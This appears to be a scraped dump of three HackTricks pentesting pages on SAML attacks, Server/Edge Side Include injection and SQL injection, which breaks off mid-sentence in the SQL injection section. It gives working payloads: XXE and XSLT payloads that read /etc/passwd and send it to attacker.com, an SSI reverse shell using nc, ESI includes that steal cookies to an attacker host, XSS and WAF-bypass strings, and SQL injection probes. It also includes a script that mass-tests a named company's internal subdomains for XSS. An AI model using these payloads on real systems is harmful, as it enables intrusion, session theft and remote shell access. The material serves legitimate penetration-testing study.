        "text": "SAML Attacks\nSAML Attacks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nSAML Basics\nAttacks Graphic\nTool\n‚Äã\nSAMLExtractor\n: A tool that can take a URL or list of URL and prints back SAML consume URL.\nXML round-trip\nIn XML the signed part of the XML is saved in memory, then some encoding/decoding is performed and the signature is checked. Ideally that encoding/decoding shouldn't change the data but based in that scenario,\nthe data being checked and the original data could not be the same\n.\nFor example, check the following code:\nrequire\n'rexml/document'\n‚Äã\ndoc\n=\nREXML\n::\nDocument\n.\nnew\n<<\nXML\n<!DOCTYPE x [ <!NOTATION x SYSTEM 'x\">]><!--'> ]>\n<X>\n<Y/><![CDATA[--><X><Z/><!--]]>-->\n</X>\nXML\n‚Äã\nputs\n\"First child in original doc: \"\n+\ndoc\n.\nroot\n.\nelements\n[\n1\n].\nname\ndoc\n=\nREXML\n::\nDocument\n.\nnew\ndoc\n.\nto_s\nputs\n\"First child after round-trip: \"\n+\ndoc\n.\nroot\n.\nelements\n[\n1\n].\nname\nRunning the program against REXML 3.2.4 or earlier would result in the following output instead:\nFirst child in original doc: Y\nFirst child after round-trip: Z\nThis is how REXML saw the original XML document from the program above:\nAnd this is how it saw it after a round of parsing and serialization:\nFor more information about the vulnerability and how to abuse it:\n‚Äã\nhttps://mattermost.com/blog/securing-xml-implementations-across-the-web/\n‚Äã\n‚Äã\nhttps://joonas.fi/2021/08/saml-is-insecure-by-design/\n‚Äã\nXML Signature Wrapping Attacks\nXML documents containing XML Signatures are typically\nprocessed in two independent steps\n:\nsignature\nvalidation\nand\nfunction\ninvocation\n(business logic). If both modules have different views on the data, a new class of vulnerabilities named XML Signature Wrapping attacks (XSW) exists.\nIn these attacks the\nadversary\nmodifies\nthe\nmessage\nstructure by\ninjecting\nforged\nelements\nwhich do not invalidate the XML Signature\n. The goal of this alteration is to change the message in such a way that the\napplication logic and the signature verification module use different parts of the message\n. Consequently, the receiver verifies the XML Signature successfully but the application logic processes the bogus element. The\nattacker thus circumvents the integrity protection\nand the origin authentication of the XML Signature and can inject arbitrary content.\nFrom the SAML request:\nXSW #1\nAn attacker can\nadd a new root element where the signature\nis found. Therefore, when the validator checks the integrity of the signature it may note that it has\ncheck\nthe\nintegrity\nof the\nResponse -> Assertion -> Subject\n, and it might get confused with the\nevil new Response -> Assertion -> Subject\npath in red and use its data.\nXSW #2\nThe difference with #1 is that the type of Signature used is a\ndetached signature\nwhere XSW #1 used an enveloping signature.\nNote how the new evil structure is the same as before trying to confuse the business logic after the integrity check was performed.\nXSW #3\nIn this attack an\nevil Assertion is created in at the same level\nas the original assertion to try to confuse the business logic and use the evil data.\nXSW #4\nXSW #4 is similar to #3, except in this case the\noriginal Assertion becomes a child\nof the copied Assertion.\nXSW #5\nIn XSW #5 the Signature and the original Assertion aren‚Äôt in one of the three standard configurations (enveloped/enveloping/detached). In this case, the copied Assertion envelopes the Signature.\nXSW #6\nXSW #6 inserts its copied Assertion into the same location as #‚Äôs 4 and 5. The interesting piece here is that the copied Assertion envelopes the Signature, which in turn envelopes the original Assertion.\nXSW #7\nXSW #7 inserts an\nExtensions\nelement and adds the copied\nAssertion\nas a\nchild\n. Extensions is a valid XML element with a\nless restrictive schema definition\n. The authors of this\nwhite paper\ndeveloped this method in response to the OpenSAML library. OpenSAML used schema validation to correctly compare the ID used during signature validation to the ID of the processed Assertion. The authors found in cases where copied Assertions with the same ID of the original Assertion were children of an element with a less restrictive schema definition, they were able to bypass this particular countermeasure.\nXSW #8\nXSW #8 uses another\nless restrictive XML element\nto perform a variation of the attack pattern used in XSW #7. This time around the original Assertion is the child of the less restrictive element instead of the copied Assertion.\nTool\nYou can use the Burp extension\nSAML Raider\nto parse the request, apply any XSW attack you choose, and launch it.\nOriginal Paper\nFor more information about this attack read the original paper in\nhttps://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf\n‚Äã\nXXE\nIf you don't know which kind of attacks are XXE, please read the following page:\nXXE - XEE - XML External Entity\nDue to the fact that SAML Responses are deflated and base64‚Äôd\nXML documents\n, we can test for\nXXE\nby manipulating the XML document sent as the SAML Response. Example:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<\n!ELEMENT\nfoo\nANY\n>\n<!ENTITY    file SYSTEM \"file:///etc/passwd\">\n<!ENTITY dtd SYSTEM \"http://www.attacker.com/text.dtd\" >\n]>\n<\nsamlp:\nResponse\n...\nID\n=\n\"\n_df55c0bb940c687810b436395cf81760bb2e6a92f2\n\"\n...\n>\n<\nsaml:\nIssuer\n>\n...\n</\nsaml:\nIssuer\n>\n<\nds:\nSignature\n...\n>\n<\nds:\nSignedInfo\n>\n<\nds:\nCanonicalizationMethod\n...\n/>\n<\nds:\nSignatureMethod\n...\n/>\n<\nds:\nReference\nURI\n=\n\"\n#_df55c0bb940c687810b436395cf81760bb2e6a92f2\n\"\n>\n...\n</\nds:\nReference\n>\n</\nds:\nSignedInfo\n>\n<\nds:\nSignatureValue\n>\n...\n</\nds:\nSignatureValue\n>\n[...]\nTool\nYou can also use the Burp extension\nSAML Raider\nto generate the POC from a SAML request to test for possible XXE vulnerabilities.\nCheck also this talk:\nhttps://www.youtube.com/watch?v=WHn-6xHL7mI\n‚Äã\nXSLT via SAML\nFor more information about XSLT go to:\nXSLT Server Side Injection (Extensible Stylesheet Language Transformations)\nExtensible Stylesheet Language Transformation (XSLT) is a Turing-complete language for transforming XML documents into other document types such as HTML, JSON, or PDF. An important aspect to note here is that\nthe attack doesn‚Äôt require a valid signature to succeed\n. The reason for this is that\nthe XSLT transformation occurs before the digital signature is processed for verification\n. Basically, we need a signed SAML Response to perform the attack, but the signature can be self-signed or invalid.\nxslt\nHere you can find a\nPOC\nto check for this kind of vulnerabilities, in the hacktricks page mentioned at the beginning of this section you can find for payloads.\n<\nds:\nSignature\nxmlns:\nds\n=\n\"\nhttp://www.w3.org/2000/09/xmldsig#\n\"\n>\n...\n<\nds:\nTransforms\n>\n<\nds:\nTransform\n>\n<\nxsl:\nstylesheet\nxmlns:\nxsl\n=\n\"\nhttp://www.w3.org/1999/XSL/Transform\n\"\n>\n<\nxsl:\ntemplate\nmatch\n=\n\"\ndoc\n\"\n>\n<\nxsl:\nvariable\nname\n=\n\"\nfile\n\"\nselect\n=\n\"\nunparsed-text('/etc/passwd')\n\"\n/>\n<\nxsl:\nvariable\nname\n=\n\"\nescaped\n\"\nselect\n=\n\"\nencode-for-uri($file)\n\"\n/>\n<\nxsl:\nvariable\nname\n=\n\"\nattackerUrl\n\"\nselect\n=\n\"'\nhttp://attacker.com/'\n\"\n/>\n<\nxsl:\nvariable\nname\n=\n\"\nexploitUrl\n\"\nselect\n=\n\"\nconcat($attackerUrl,$escaped)\n\"\n/>\n<\nxsl:\nvalue-of\nselect\n=\n\"\nunparsed-text($exploitUrl)\n\"\n/>\n</\nxsl:\ntemplate\n>\n</\nxsl:\nstylesheet\n>\n</\nds:\nTransform\n>\n</\nds:\nTransforms\n>\n...\n</\nds:\nSignature\n>\nTool\nYou can also use the Burp extension\nSAML Raider\nto generate the POC from a SAML request to test for possible XSLT vulnerabilities.\nCheck also this talk:\nhttps://www.youtube.com/watch?v=WHn-6xHL7mI\n‚Äã\nXML Signature Exclusion\nSignature Exclusion is used to test how the SAML implementation behaves when there is\nno Signature elemen\nt. When a Signature element is\nabsent\nthe\nsignature validation step may get skipped entirely\n. If the Signature isn‚Äôt validated, then any of the contents that would typically be signed may be tampered with by an attacker.\nTool\nSignature exclusion begins with intercepting the SAML Response then clicking\nRemove Signatures\n. In doing so\nall\nSignature elements are removed.\nsig-exclusion\nWith the signatures removed, allow the request to proceed to the target. If the Signature isn‚Äôt required by the Service\nCertificate Faking\nCertificate faking is the process of testing whether or not the Service Provider\nverifies that a trusted Identity Provider signed the SAML Message.\nThe trust relationship between SP and IdP is established and\nshould be verified\neach time a SAML Message is received. What this comes down to is using a\nself-signed\ncertificate to sign the SAML Response or Assertion.\nTool\nThe Burp extension\nSAML Raider\nis going to be used.\nTo fake a certificate, begin by intercepting the SAML Response.\nIf there is a Signature included in the Response, use the\nSend Certificate to SAML Raider Certs\nbutton.\nsend-cert\nAfter sending the certificate, we should see an imported certificate in the SAML Raider Certificates tab. Once there, we highlight the imported cert and press the\nSave and Self-Sign\nbutton.\nsent-cert\nDoing so generates a self-signed clone of the original certificate. Now it‚Äôs time to move back to the intercepted request still held in burp‚Äôs Proxy. First, select the new self-signed cert from the XML Signature dropdown menu. Then use the\nRemove Signatures\nbutton to remove any existing signatures. Finally, use the\n(Re-)Sign Message\nor\n(\nRe-)Sign Assertion\nbutton (\nwhichever\nis\nmore\nappropriate\nin your given situation).\nremove-sig\nAfter signing the message with the self-signed cert, send it on its way. If we authenticate, we know that we can sign our SAML Messages. The ability to sign our SAML Messages means we can change values in the Assertion and they will be accepted by the Service Provider.\nToken Recipient Confusion / Service Provider Target Confusion\nToken Recipient Confusion / Service Provider Target CONfusion\ntests whether or not the Service Provider validates the Recipient\n. This means, that\nif the response was meant for a different Service Provide\nr, the\ncurrent\nService Provider should notice it and\nreject the authentication\n.\nThe\nRecipient\nfield is an attribute of the\nSubjectConfirmationData\nelement, which is a child of the Subject element in a SAML Response.\nThe SubjectConfirmationData element specifies additional data that allows the subject to be confirmed or constrains the circumstances under which the act of subject confirmation can take place. Subject confirmation takes place when a relying party seeks to verify the relationship between an entity presenting the assertion (that is, the attesting entity) and the subject of the assertion‚Äôs claims.\nThe Recipient attribute found on the\nSubjectConfirmationData element is a URL that specifies the location to which the Assertion must be delivered\n. If the Recipient is a different Service Provider than the one who receives it, the Assertion should not be accepted.\nHow-to\nSAML Token Recipient Confusion (SAML-TRC) has a few prequisite conditions in order for us to attempt exploitation. First, we\nneed\nto have a\nlegitimate account on a Service Provider\n. Second,\nSP-Target must accept tokens issued by the same Identity Provider that services SP-Legit\n.\nThe attack is relatively simple if the conditions are true. We\nauthenticate\nto\nSP-Legit\nvia the shared Identity Provider. We then\nintercept the SAML Response on its way from the IdP to SP-Legit\n. Once intercepted, we send the\nSAML Response that was intended for SP-Legit to SP-Target instead.\nIf\nSP-Target accepts the Assertion\n; we‚Äôll find ourselves logged in with the same account name as we have for SP-Legit and get access to SP-Target‚Äôs corresponding resources.\nXSS in Logout functionality\n(Access the\noriginal research here\n)\nAfter performing the directory brute forcing I found the following page:\nhttps://carbon-prototype.uberinternal.com:443/oidauth/logout\nIt's a logout page, I opened the above link and it did redirect me to the following page\nhttps://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1\nThe base parameter is taking a URL so how about replacing that with the old classic\njavascript:alert(123);\nto trigger an XSS.\nMass Exploitation\nUsing\nSAMLExtractor\nthat can take a list of URLs and then give you back the callback (SAML consume) URL, I decided to feed the tool with all subdomains of\nuberinternal.com\nto see if there are other domains that use the same library and there was.\nWhat I did next was to create a script that calls the vulnerable page\noidauth/prompt\nand try the XSS and if my input is reflected it gives me a nice vulnerable message.\nimport\nrequests\nimport\nurllib3\nurllib3\n.\ndisable_warnings\n(\nurllib3\n.\nexceptions\n.\nInsecureRequestWarning\n)\nfrom\ncolorama\nimport\ninit\n,\nFore\n,\nBack\n,\nStyle\ninit\n()\n‚Äã\nwith\nopen\n(\n\"/home/fady/uberSAMLOIDAUTH\"\n)\nas\nurlList\n:\nfor\nurl\nin\nurlList\n:\nurl2\n=\nurl\n.\nstrip\n().\nsplit\n(\n\"oidauth\"\n)[\n0\n]\n+\n\"oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1\"\nrequest\n=\nrequests\n.\nget\n(\nurl2\n,\nallow_redirects\n=\nTrue\n,\nverify\n=\nFalse\n)\ndoesit\n=\nFore\n.\nRED\n+\n\"no\"\nif\n(\n\"Fady\"\nin\nrequest\n.\ncontent\n):\ndoesit\n=\nFore\n.\nGREEN\n+\n\"yes\"\nprint\n(\nFore\n.\nWHITE\n+\nurl2\n)\nprint\n(\nFore\n.\nWHITE\n+\n\"Len : \"\n+\nstr\n(\nlen\n(\nrequest\n.\ncontent\n))\n+\n\"   Vulnerable : \"\n+\ndoesit\n)\nReferences\nThe attacks were obtained from\nhttps://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/\nYou can find additional resources and write-ups in\nhttps://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nReset/Forgotten Password Bypass\nNext\nSAML Basics\nLast modified\n6mo ago"
    },
    {
        "title": "Server Side Inclusion/Edge Side Inclusion Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection",
        "text": "Server Side Inclusion/Edge Side Inclusion Injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nServer Side Inclusion Basic Information\nSSI (Server Side Includes) are directives that are\nplaced in HTML pages, and evaluated on the server\nwhile the pages are being served. They let you\nadd dynamically generated content\nto an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.\nFor example, you might place a directive into an existing HTML page, such as:\n<!--#echo var=\"DATE_LOCAL\" -->\nAnd, when the page is served, this fragment will be evaluated and replaced with its value:\nTuesday, 15-Jan-2013 19:28:54 EST\nThe decision of when to use SSI, and when to have your page entirely generated by some program, is usually a matter of how much of the page is static, and how much needs to be recalculated every time the page is served. SSI is a great way to add small pieces of information, such as the current time - shown above. But if a majority of your page is being generated at the time that it is served, you need to look for some other solution. (Definition taken from\nhere\n).\nYou can infer the presence of SSI if the web application uses files with the extensions **\n.shtml\n,\n.shtm\nor\n.stm\n**, but it's not only the case.\nA typical SSI expression has the following format:\n<!--#directive param=\"value\" -->\nCheck\n// Document name\n<!--\n#echo\nvar\n=\n\"DOCUMENT_NAME\"\n-->\n// Date\n<!--\n#echo\nvar\n=\n\"DATE_LOCAL\"\n-->\n‚Äã\n// File inclusion\n<!--\n#include virtual\n=\n\"/index.html\"\n-->\n// Including files (same directory)\n<!--\n#include file\n=\n\"file_to_include.html\"\n-->\n// CGI Program results\n<!--\n#include virtual\n=\n\"/cgi-bin/counter.pl\"\n-->\n// Including virtual files (same directory)\n<!--\n#include virtual\n=\n\"file_to_include.html\"\n-->\n// Modification date of a file\n<!--\n#flastmod file\n=\n\"index.html\"\n-->\n‚Äã\n// Command exec\n<!--\n#exec cmd\n=\n\"dir\"\n-->\n// Command exec\n<!--\n#exec cmd\n=\n\"ls\"\n-->\n// Reverse shell\n<!--\n#exec cmd\n=\n\"mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo\"\n-->\n‚Äã\n// Print all variables\n<!--\n#printenv\n-->\n// Setting variables\n<!--\n#\nset\nvar\n=\n\"name\"\nvalue\n=\n\"Rich\"\n-->\n‚Äã\nEdge Side Inclusion\nThere is a problem\ncaching information or dynamic applications\nas part of the content may have\nvaried\nfor the next time the content is retrieved. This is what\nESI\nis used form, to indicate using ESI tags the\ndynamic content that needs to be generated\nbefore sending the cache version.\nif an\nattacker\nis able to\ninject an ESI tag\ninside the cache content, then, he could be able to i\nnject arbitrary content\non the document before it's sent to the users.\nESI Detection\nThe following\nheader\nin a response from the server means that the server is using ESI:\nSurrogate-Control: content=\"ESI/1.0\"\nIf you can't find this header, the server\nmight be using ESI anyways\n.\nA\nblind exploitation approach can also be used\nas a request should arrive to the attackers server:\n// Basic detection\nhell\n<!--\nesi\n-->\no\n// If previous is reflected as \"hello\", it's vulnerable\n‚Äã\n// Blind detection\n<\nesi\n:\ninclude src\n=\nhttp\n://\nattacker\n.\ncom\n>\n‚Äã\n// XSS Exploitation Example\n<\nesi\n:\ninclude src\n=\nhttp\n://\nattacker\n.\ncom\n/\nXSSPAYLOAD\n.\nhtml\n>\n‚Äã\n// Cookie Stealer (bypass httpOnly flag)\n<\nesi\n:\ninclude src\n=\nhttp\n://\nattacker\n.\ncom\n/?\ncookie_stealer\n.\nphp\n?=\n$\n(\nHTTP_COOKIE\n)\n>\n‚Äã\n// Introduce private local files (Not LFI per se)\n<\nesi\n:\ninclude src\n=\n\"supersecret.txt\"\n>\n‚Äã\n// Valid for Akamai, sends debug information in the response\n<\nesi\n:\ndebug\n/>\nESI exploitation\n‚Äã\nGoSecure\nhas created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. Let us provide some explanations regarding the column names of the below table first:\nIncludes\n: Supports the\n<esi:includes>\ndirective\nVars\n: Supports the\n<esi:vars>\ndirective. Useful for bypassing XSS Filters\nCookie\n: Document cookies are accessible to the ESI engine\nUpstream Headers Required\n: Surrogate applications will not process ESI statements unless the upstream application provides the headers\nHost Allowlist\n: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts\nSoftware\nIncludes\nVars\nCookies\nUpstream Headers Required\nHost Whitelist\nSquid3\nYes\nYes\nYes\nYes\nNo\nVarnish Cache\nYes\nNo\nNo\nYes\nYes\nFastly\nYes\nNo\nNo\nNo\nYes\nAkamai ESI Test Server (ETS)\nYes\nYes\nYes\nNo\nNo\nNodeJS esi\nYes\nYes\nYes\nNo\nNo\nNodeJS nodesi\nYes\nNo\nNo\nNo\nOptional\nXSS\nThe following ESI directive will load an arbitrary file inside the response of the server\n<\nesi:\ninclude\nsrc\n=\nhttp://attacker.com/xss.html\n>\nThe file\nhttp://attacker.com/xss.html\nmay contain a XSS payload like\n<script>alert(1)</script>\nBypass client XSS protection\nx=\n<\nesi:\nassign\nname\n=\n\"\nvar1\n\"\nvalue\n=\n\"'\ncript'\n\"\n/>\n<s\n<\nesi:\nvars\nname\n=\n\"\n$(var1)\n\"\n/>\n>alert(/Chrome%20XSS%20filter%20bypass/);</s\n<\nesi:\nvars\nname\n=\n\"\n$(var1)\n\"\n/>\n>\n‚Äã\nUse\n<!--esi-->\nto bypass WAFs:\n<scr\n<!--esi-->\nipt>aler\n<!--esi-->\nt(1)</sc\n<!--esi-->\nript>\n<img+src=x+on\n<!--esi-->\nerror=ale\n<!--esi-->\nrt(1)>\nSteal Cookie\nRemote steal cookie\n<\nesi:\ninclude\nsrc\n=\nhttp://attacker.com/$(HTTP_COOKIE)\n>\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})\n\"\n/>\nSteal cookie HTTP_ONLY with XSS by reflecting it in the response:\n# This will reflect the cookies in the response\n<!\n--esi\n$(\nHTTP_COOKIE\n)\n--\n>\n# Reflect XSS\n<!\n--esi/\n$url_decode\n(\n'\"><svg/onload=prompt(1)>'\n)\n/--\n>\nFull account takeover by reflecting cookies\nPrivate Local File\nDo not confuse this with a \"Local File Inclusion\":\n<\nesi:\ninclude\nsrc\n=\n\"\nsecret.txt\n\"\n>\nCRLF\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/\n\"\n/>\nOpen Redirect\nThe following will add a\nLocation\nheader to the response\n<!\n--esi\n$add_header\n(\n'Location'\n,\n'http://attacker.com'\n)\n--\n>\nAdd Header\nAdd header in forced request\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://example.com/asdasd\n\"\n>\n<\nesi:\nrequest_header\nname\n=\n\"\nUser-Agent\n\"\nvalue\n=\n\"\n12345\n\"\n/>\n</\nesi:\ninclude\n>\nAdd header in response (useful to bypass \"Content-Type: text/json\" in a response with XSS)\n<!\n--esi/\n$add_header\n(\n'Content-Type'\n,\n'text/html'\n)\n/--\n>\n‚Äã\n<!\n--esi/\n$(\nHTTP_COOKIE\n)\n/\n$add_header\n(\n'Content-Type'\n,\n'text/html'\n)\n/\n$url_decode\n(\n$url_decode\n(\n'\"><svg/onload=prompt(1)>'\n))\n/--\n>\nCRLF in Add header (\nCVE-2019-2438)\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://example.com/asdasd\n\"\n>\n<\nesi:\nrequest_header\nname\n=\n\"\nUser-Agent\n\"\nvalue\n=\n\"\n12345\nHost: anotherhost.com\n\"\n/>\n</\nesi:\ninclude\n>\nAkamai debug\nThis will send debug information included in the response:\n<\nesi:\ndebug\n/>\nESI + XSLT = XXE\nIt is also possible to add **\n_\neXtensible Stylesheet Language Transformations (XSLT)\n_\n** based ESI includes by specifying the\nxslt\nvalue to the\ndca\nparameter. The following include will cause the HTTP surrogate to request the XML and XSLT file. The XSLT file is then used to filter the XML file. This XML file can be used to perform\nXML External Entity (XXE)\nattacks. This allows attackers to perform SSRF attacks, which is not very useful since this must be performed through ESI includes, which is an SSRF vector itself. External DTDs are not parsed since the underlying library (Xalan) has no support for it. This means we cannot extract local files.\n<\nesi:\ninclude\nsrc\n=\n\"\nhttp://host/poc.xml\n\"\ndca\n=\n\"\nxslt\n\"\nstylesheet\n=\n\"\nhttp://host/poc.xsl\n\"\n/>\nThe XSLT file:\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!\nDOCTYPE\nxxe\n[\n<!ENTITY xxe SYSTEM \"http://evil.com/file\" >\n]>\n<\nfoo\n>\n&xxe;\n</\nfoo\n>\nCheck the XSLT page:\nXSLT Server Side Injection (Extensible Stylesheet Language Transformations)\nReferences\n‚Äã\nhttps://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/\n‚Äã\n‚Äã\nhttps://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/\n‚Äã\n‚Äã\nhttps://academy.hackthebox.com/module/145/section/1304\n‚Äã\n‚Äã\nhttps://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91\n‚Äã\nBrute-Force Detection List\nAuto_Wordlists/ssi_esi.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSAML Basics\nNext\n- Pentesting Web\nSQL Injection\nLast modified\n6mo ago"
    },
    {
        "title": "SQL Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/sql-injection",
        "text": "SQL Injection\n‚Äã\n\u0000\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã‚Äã‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nWhat is SQL injection?\nSQL injection is a web security vulnerability that allows an attacker to\ninterfere\nwith the\nqueries\nthat an application makes to its\ndatabase\n. It generally allows an attacker to\nview data\nthat they are not normally able to retrieve. This might include data belonging to\nother users\n, or any other data that the\napplication\nitself is able to\naccess\n. In many cases, an attacker can\nmodify\nor\ndelete\nthis data, causing persistent changes to the application's content or behaviour.\nIn some situations, an attacker can escalate an SQL injection attack to\ncompromise the underlying server\nor other back-end infrastructure, or perform a denial-of-service attack. (From\nhere\n).\nIn this POST I'm going to suppose that we have found a possible SQL injection and we are going to discuss possible methods to confirm the SQL injection, recon the database and perform actions.\nEntry point detection\nYou may have found a site that is\napparently vulnerable to SQL\ni just because the server is behaving weird with SQLi related inputs. Therefore, the\nfirst thing\nyou need to do is how to\ninject data in the query without breaking it.\nTo do so you first need to find how to\nescape from the current context.\nThese are some useful examples:\n[Nothing]\n'\n\"\n`\n')\n\")\n`)\n'))\n\"))\n`))\nThen, you need to know how to\nfix the query so there isn't errors\n. In order to fix the query you can\ninput\ndata so the\nprevious query accept the new data\n, or you can just\ninput\nyour data and\nadd a comment symbol add the end\n.\nNote that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy.\nComments\nMySQL\n#comment\n-- comment     [Note the space after the double dash]\n/*comment*/\n/*! MYSQL Special SQL */\n‚Äã\nPostgreSQL\n--comment\n/*comment*/\n‚Äã\nMSQL\n--comment\n/*comment*/\n‚Äã\nOracle\n--comment\n‚Äã\nSQLite\n--comment\n/*comment*/\n‚Äã\nHQL\nHQL does\nnot\nsupport comments\nConfirming with logical operations\nOne of the best ways to confirm a SQL injection is by making it operate a\nlogical operation\nand having the expected results.\nFor example: if the GET parameter\n?username=Peter\nreturns the same content as\n?username=Peter' or '1'='1\nthen, you found a SQL injection.\nAlso you can apply this concept to\nmathematical operations\n. Example: If\n?id=1\nreturns the same as\n?id=2-1\n, SQLinjection.\npage.asp?id=1 or 1=1 -- true\npage.asp?id=1' or 1=1 -- true\npage.asp?id=1\" or 1=1 -- true\npage.asp?id=1 and 1=2 -- false\nThis word-list was created to try to\nconfirm SQLinjections\nin the proposed way:\nsqli-logic.txt\n811B\nText\nConfirming with Timing\nIn some cases you\nwon't notice any change\non the page you are testing. Therefore, a good way to\ndiscover blind SQL injections\nis making the DB perform actions and will have an\nimpact on the time\nthe page need to load.\nTherefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:\nMySQL (string concat and logical ops)\n1' + sleep(10)\n1' and sleep(10)\n1' && sleep(10)\n1' | sleep(10)\n‚Äã\nPostgreSQL (only support string concat)\n1' || pg_sleep(10)\n‚Äã\nMSQL\n1' WAITFOR DELAY '0:0:10'\n‚Äã\nOracle\n1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])\n1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)\n‚Äã\nSQLite\n1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nIn some cases the\nsleep functions won't be allowed\n. Then, instead of using those functions you could make the query\nperform complex operations\nthat will take several seconds.\nExamples of these techniques are going to be commented separately on each technology (if 